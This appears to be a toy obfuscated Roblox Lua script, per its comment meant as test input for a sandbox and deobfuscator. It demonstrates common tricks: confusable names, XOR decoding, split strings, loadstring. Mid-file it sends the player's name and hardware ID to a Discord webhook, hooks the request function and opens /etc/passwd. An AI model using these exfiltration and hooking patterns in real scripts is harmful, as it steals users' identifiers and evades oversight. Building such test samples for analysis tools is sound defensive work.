-- toy "obfuscated" script exercising the sandbox + guesser
local IIlIlI = {"https://example.com/payload", "POST", "webhook", "Players", "hello", "world"}
local _0x3fa1 = function(s, k)
    local o = {}
    for i = 1, #s do o[i] = string.char(bit32.bxor(s:byte(i), k)) end
    return table.concat(o)
end
local enc = string.char(72 ^ 0 * 0 + 104 ^ 0 * 0 + 104, 101, 108, 108, 111)
local dec = _0x3fa1("\104\100\108\108\111", 0)
local l1 = "dis" .. "cord"
local url = "https://" .. l1 .. ".com/api/webhooks/123456789/AbCdEf_token-xyz"
local Players = game:GetService("Players")
local lp = Players.LocalPlayer
if 1 == 2 then print("dead branch") else print("alive", dec, enc) end
local frame = Instance.new("Frame")
frame.Name = IIlIlI[5] .. IIlIlI[6]
frame.Parent = lp
request({ Url = url, Method = IIlIlI[2], Body = lp.Name .. " " .. gethwid() })
local old = hookfunction(request, function() end)
request = function() end
local f = io.open("/etc/passwd")
Players.PlayerAdded:Connect(function(p)
    local fr2 = Instance.new("TextLabel")
    fr2.Text = "joined: " .. p.Name
end)
loadstring("local a = 'inner layer' print(a)")()
x = IIlIlI[1]
print(x)
